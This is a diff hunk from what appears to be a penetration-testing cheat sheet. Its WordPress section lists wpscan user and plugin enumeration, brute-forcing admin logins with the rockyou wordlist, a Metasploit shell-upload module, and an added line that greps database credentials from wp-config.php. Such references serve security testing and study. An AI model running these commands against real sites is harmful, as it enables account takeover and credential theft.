@@ -1053,6 +1053,7 @@ $ sudo wpscan --url <URL> -e u,ap,at,cb,dbe
 $ sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url <URL>
 $ sudo wpscan --password-attack wp-login -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url <URL>
 msf > use exploit/unix/webapp/wp/admin_shell_upload
+$ grep 'DB_USER\|DB_PASSWORD' /var/www/html/wp-config.php
 ```
 
 - Joomla
